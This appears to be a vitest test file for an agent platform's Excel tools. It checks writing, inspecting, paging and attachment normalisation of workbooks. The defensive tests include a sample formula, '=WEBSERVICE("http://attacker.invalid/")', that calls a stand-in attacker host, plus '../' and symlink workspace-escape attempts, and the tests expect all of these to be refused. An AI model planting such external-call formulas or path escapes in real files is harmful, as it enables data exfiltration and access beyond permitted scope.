import { mkdir, mkdtemp, readFile, rm, stat, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { expect } from "vitest";
import { test } from "@openwork/testkit";

import { OpenWorkOfficeAttachments } from "../../apps/server/src/opencode-plugins/openwork-office-attachments";
import { OpenWorkSpreadsheets } from "../../apps/server/src/opencode-plugins/openwork-spreadsheets";
import { buildZip, listZipEntries } from "../../packages/workbook/src/index";

const XLSX_MIME = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";

type ToolPlugin = Awaited<ReturnType<typeof OpenWorkSpreadsheets>>;

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null && !Array.isArray(value);
}

function json(text: string): Record<string, unknown> {
  const parsed: unknown = JSON.parse(text);
  if (!isRecord(parsed)) throw new Error("Expected a JSON object tool result");
  return parsed;
}

function firstTextPart(messages: unknown[]): string {
  const message = messages[0];
  if (!isRecord(message) || !Array.isArray(message.parts)) throw new Error("Expected message parts");
  const part = message.parts[0];
  if (!isRecord(part) || typeof part.text !== "string") throw new Error("Expected a normalized text part");
  return part.text;
}

function fieldValue(text: string, name: string): string {
  const line = text.split("\n").find((item) => item.startsWith(`${name}: `));
  if (!line) throw new Error(`Missing ${name} line`);
  return line.slice(name.length + 2);
}

/** Emit the archive the way Excel and Google Sheets do: bit 3 set, zero local sizes, trailing descriptors. */
function withDataDescriptors(archive: Buffer): Buffer {
  const entries = listZipEntries(archive);
  const eocd = archive.length - 22;
  let cursor = archive.readUInt32LE(eocd + 16);
  const local: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const entry of entries) {
    const nameLength = archive.readUInt16LE(entry.localOffset + 26);
    const extraLength = archive.readUInt16LE(entry.localOffset + 28);
    const dataStart = entry.localOffset + 30 + nameLength + extraLength;
    const data = archive.subarray(dataStart, dataStart + entry.compressedSize);
    const header = Buffer.from(archive.subarray(entry.localOffset, dataStart));
    header.writeUInt16LE(header.readUInt16LE(6) | 0x0008, 6);
    header.writeUInt32LE(0, 14);
    header.writeUInt32LE(0, 18);
    header.writeUInt32LE(0, 22);
    const descriptor = Buffer.alloc(16);
    descriptor.writeUInt32LE(0x08074b50, 0);
    descriptor.writeUInt32LE(archive.readUInt32LE(cursor + 16), 4);
    descriptor.writeUInt32LE(entry.compressedSize, 8);
    descriptor.writeUInt32LE(entry.uncompressedSize, 12);
    local.push(header, data, descriptor);
    const centralLength = 46 + archive.readUInt16LE(cursor + 28) + archive.readUInt16LE(cursor + 30) + archive.readUInt16LE(cursor + 32);
    const centralEntry = Buffer.from(archive.subarray(cursor, cursor + centralLength));
    centralEntry.writeUInt16LE(centralEntry.readUInt16LE(8) | 0x0008, 8);
    centralEntry.writeUInt32LE(offset, 42);
    central.push(centralEntry);
    offset += header.length + data.length + descriptor.length;
    cursor += centralLength;
  }
  const end = Buffer.from(archive.subarray(eocd));
  end.writeUInt32LE(central.reduce((sum, chunk) => sum + chunk.length, 0), 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...local, ...central, end]);
}

async function attachedWorkbook(): Promise<Buffer> {
  return withDataDescriptors(Buffer.from(await buildZip([
    { name: "xl/workbook.xml", data: Buffer.from('<workbook xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Pipeline" sheetId="1" r:id="rId1"/><sheet name="Notes" sheetId="2" r:id="rId2"/></sheets></workbook>', "utf8") },
    { name: "xl/_rels/workbook.xml.rels", data: Buffer.from('<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet2.xml"/></Relationships>', "utf8") },
    { name: "xl/styles.xml", data: Buffer.from('<styleSheet><cellXfs count="2"><xf numFmtId="0"/><xf numFmtId="14"/></cellXfs></styleSheet>', "utf8") },
    { name: "xl/worksheets/sheet1.xml", data: Buffer.from('<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Account</t></is></c><c r="B1" t="inlineStr"><is><t>Close date</t></is></c><c r="C1" t="inlineStr"><is><t>Amount</t></is></c></row><row r="2"><c r="A2" t="inlineStr"><is><t>Northstar</t></is></c><c r="B2" s="1"><v>45000</v></c><c r="C2"><v>1742.42</v></c></row><row r="3"><c r="A3" t="inlineStr"><is><t>Total</t></is></c><c r="B3" s="1"/><c r="C3"><f>SUM(C2:C2)</f><v>1742.42</v></c></row></sheetData></worksheet>', "utf8") },
    { name: "xl/worksheets/sheet2.xml", data: Buffer.from('<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Sentinel note: reviewed 2026-09-02</t></is></c></row></sheetData></worksheet>', "utf8") },
  ])));
}

async function withWorkspace(fn: (root: string) => Promise<void>) {
  const root = await mkdtemp(join(tmpdir(), "openwork-excel-tools-"));
  try {
    await fn(root);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}

test("agents create, inspect, and page through Excel workbooks without leaving the workspace", async ({ evidence }) => {
  await withWorkspace(async (root) => {
    const plugin: ToolPlugin = await OpenWorkSpreadsheets({ directory: root });

    // The tool never creates folders, so nothing can be created through a swapped path.
    await expect(plugin.tool.spreadsheet_write.execute({ path: "reports/pipeline.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow('the folder "reports" does not exist');
    await mkdir(join(root, "reports"));
    const written = json(await plugin.tool.spreadsheet_write.execute({
      path: "reports/pipeline.xlsx",
      sheets: [
        { name: "Summary", rows: [["Account", "Amount", "Won"], ["Northstar", 1742.42, true], ["Total", { formula: "SUM(B2:B2)" }, null], ["Pasted", '=WEBSERVICE("http://attacker.invalid/")', null]] },
        { name: "Detail", header: false, rows: Array.from({ length: 120 }, (_row, index) => [index + 1, `row ${index + 1}`]) },
      ],
    }));
    expect(written).toMatchObject({ ok: true, path: "reports/pipeline.xlsx", replaced: false });
    expect(written.sheets).toEqual([{ name: "Summary", rows: 4, columns: 3 }, { name: "Detail", rows: 120, columns: 2 }]);
    const bytes = await readFile(join(root, "reports", "pipeline.xlsx"));
    expect(bytes.subarray(0, 2).toString("latin1")).toBe("PK");

    const inspected = json(await plugin.tool.spreadsheet_inspect.execute({ path: "reports/pipeline.xlsx" }));
    expect(inspected).toMatchObject({ ok: true, sha256: expect.stringMatching(/^[0-9a-f]{64}$/), dateSystem: "1900" });
    expect(inspected.sheets).toEqual([
      expect.objectContaining({ position: 1, name: "Summary", usedRange: "A1:C4", rows: 4, columns: 3, formulas: 1, header: ["Account", "Amount", "Won"] }),
      expect.objectContaining({ position: 2, name: "Detail", usedRange: "A1:B120", rows: 120, columns: 2, formulas: 0 }),
    ]);

    const summary = await plugin.tool.spreadsheet_read.execute({ path: "reports/pipeline.xlsx", sheet: "Summary" });
    expect(summary).toContain("| # | A | B | C |");
    expect(summary).toContain("| 2 | Northstar | 1742.42 | TRUE |");
    expect(summary).toContain("| 3 | Total | =SUM(B2:B2) |  |");
    // Negative half: a pasted string that looks like a formula stays text, and
    // an explicit formula that reaches outside the workbook is refused.
    expect(summary).toContain('| 4 | Pasted | =WEBSERVICE("http://attacker.invalid/") |  |');
    expect(summary).toContain("formulas: B3: =SUM(B2:B2)");
    expect(summary).not.toContain("B4:");
    await expect(plugin.tool.spreadsheet_write.execute({ path: "reports/unsafe.xlsx", sheets: [{ rows: [[{ formula: 'WEBSERVICE("http://attacker.invalid/")' }]] }] })).rejects.toThrow("only calculations inside the workbook are written");
    await expect(stat(join(root, "reports", "unsafe.xlsx"))).rejects.toThrow();
    expect(summary).not.toContain("next:");

    const firstPage = await plugin.tool.spreadsheet_read.execute({ path: "reports/pipeline.xlsx", sheet: "Detail", maxRows: 100 });
    expect(firstPage).toContain("| 100 | 100 | row 100 |");
    expect(firstPage).not.toContain("| 101 | 101 | row 101 |");
    expect(firstPage).toContain('next: spreadsheet_read({ path: "reports/pipeline.xlsx", sheet: "Detail", startRow: 101, maxRows: 100 })');
    const secondPage = await plugin.tool.spreadsheet_read.execute({ path: "reports/pipeline.xlsx", sheet: "Detail", startRow: 101, maxRows: 100 });
    expect(secondPage).toContain("| 101 | 101 | row 101 |");
    expect(secondPage).toContain("| 120 | 120 | row 120 |");
    expect(secondPage).not.toContain("next:");

    const outside = await mkdtemp(join(tmpdir(), "openwork-excel-tools-outside-"));
    try {
      await symlink(outside, join(root, "linked"), "dir");
      await expect(plugin.tool.spreadsheet_read.execute({ path: "../secret.xlsx" })).rejects.toThrow("outside the active workspace");
      await expect(plugin.tool.spreadsheet_write.execute({ path: "linked/escape.xlsx", sheets: [{ rows: [["x"]] }] })).rejects.toThrow("passes through a symbolic link");
      await expect(stat(join(outside, "escape.xlsx"))).rejects.toThrow();
      await expect(plugin.tool.spreadsheet_write.execute({ path: "reports/pipeline.xlsx", sheets: [{ rows: [["clobber"]] }] })).rejects.toThrow("already exists. Pass overwrite: true");
      expect(await readFile(join(root, "reports", "pipeline.xlsx"))).toEqual(bytes);
    } finally {
      await rm(outside, { recursive: true, force: true });
    }

    evidence.recordAssertionEvidence(
      "Agents can create, inspect, and page through Excel workbooks",
      "spreadsheet_write produced a two-sheet .xlsx whose typed values, explicit formula, header row, and 120-row sheet were read back through spreadsheet_inspect and paged spreadsheet_read; a pasted string starting with = stayed text, a WEBSERVICE formula was refused without creating a file, reads and writes outside the workspace were refused, and an existing workbook was not replaced without overwrite.",
      true,
    );
  });
});

test("attached Excel workbooks reach the model as a sheet grid with a path the spreadsheet tools can read", async ({ evidence }) => {
  await withWorkspace(async (root) => {
    const workbook = await attachedWorkbook();
    const plugin = await OpenWorkOfficeAttachments({ directory: root });
    const output = {
      messages: [{
        role: "user",
        parts: [{ id: "part-xlsx", type: "file", filename: "Pipeline.xlsx", mediaType: XLSX_MIME, url: `data:${XLSX_MIME};base64,${workbook.toString("base64")}` }],
      }],
    };
    await plugin["experimental.chat.messages.transform"]({}, output);

    const text = firstTextPart(output.messages);
    expect(text).toContain("sheet_count: 2");
    expect(text).toContain('sheet "Pipeline" (1 of 2)');
    expect(text).toContain("| 1 | Account | Close date | Amount |");
    expect(text).toContain("| 2 | Northstar | 2023-03-15 | 1742.42 |");
    expect(text).toContain("| 3 | Total |  | 1742.42 |");
    expect(text).toContain("formulas: C3: =SUM(C2:C2) → 1742.42");
    expect(text).toContain('sheet "Notes" (2 of 2)');
    expect(text).toContain("| 1 | Sentinel note: reviewed 2026-09-02 |");
    expect(text).not.toContain("extraction_error");
    expect(JSON.stringify(output.messages)).not.toContain('"type":"file"');
    expect(JSON.stringify(output.messages)).not.toContain(workbook.toString("base64"));

    const materializedPath = fieldValue(text, "worker_relative_path");
    expect(materializedPath).toMatch(/^\.opencode\/openwork\/inbox\/chat-attachments\/[0-9a-f]{16}-Pipeline\.xlsx$/);
    expect(fieldValue(text, "next_step")).toContain(`spreadsheet_read with path ${JSON.stringify(materializedPath)}`);
    await expect(readFile(join(root, materializedPath))).resolves.toEqual(workbook);

    const tools = await OpenWorkSpreadsheets({ directory: root });
    const notes = await tools.tool.spreadsheet_read.execute({ path: materializedPath, sheet: "Notes" });
    expect(notes).toContain("| 1 | Sentinel note: reviewed 2026-09-02 |");
    const inspected = json(await tools.tool.spreadsheet_inspect.execute({ path: materializedPath }));
    expect(inspected.sheets).toEqual([
      expect.objectContaining({ name: "Pipeline", usedRange: "A1:C3", formulas: 1 }),
      expect.objectContaining({ name: "Notes", usedRange: "A1:A1" }),
    ]);

    const system = { system: ["engine prompt"] };
    await tools["experimental.chat.system.transform"]({}, system);
    expect(system.system).toHaveLength(1);
    expect(system.system[0].match(/## Spreadsheets and Excel workbooks/g)).toHaveLength(1);

    evidence.recordAssertionEvidence(
      "Attached workbooks become a readable grid plus a tool-reachable path",
      "A data-descriptor .xlsx attachment (the archive shape Excel and Google Sheets emit) was normalized into per-sheet Markdown grids with decoded dates and formulas, the raw file part never reached the provider payload, and the materialized path was readable by spreadsheet_inspect and spreadsheet_read while the system prompt carried one spreadsheets section.",
      true,
    );
  });
});
